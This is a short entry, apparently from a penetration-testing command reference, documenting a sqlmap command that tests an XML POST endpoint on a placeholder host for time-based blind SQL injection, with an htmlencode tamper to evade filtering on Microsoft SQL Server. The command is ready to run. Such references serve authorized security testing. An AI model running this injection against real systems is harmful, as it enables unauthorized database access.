---
id: c-sqlmap-tamper-test
data: >-
  sqlmap -u "http://target-subdomain.example.com/upload"
  --data="<xml><MainAccount>1</MainAccount></xml>" --method=POST
  --tamper=htmlencode --dbms=mssql --technique=T --batch
tags:
  - sqli
  - automation
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.274Z'
verified: false
validated: true
submitted: true
---
# sqlmap -u "http://target-subdomain.example.com/upload" --data="<xml><MainAccount>1</MainAccount></xml>" --method=POST --tamper=htmlencode --dbms=mssql --technique=T --batch

## Command

```bash
sqlmap -u "http://target-subdomain.example.com/upload" --data="<xml><MainAccount>1</MainAccount></xml>" --method=POST --tamper=htmlencode --dbms=mssql --technique=T --batch
```

## Description

Automates time-based SQLi testing with tamper for XML.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u` | URL | Yes |
| `--tamper` | Encoding bypass | Yes |
| `--technique=T` | Time-based | Yes |

## Examples

### Basic Usage

```bash
sqlmap -u url --data=xml --tamper=htmlencode --technique=T
```

## Expected Output

DBMS: Microsoft SQL Server 2012; injectable: True

## Related

- [[procedures/Automate-SQLi-Exploitation-with-sqlmap]]
- [[tools/sqlmap]]
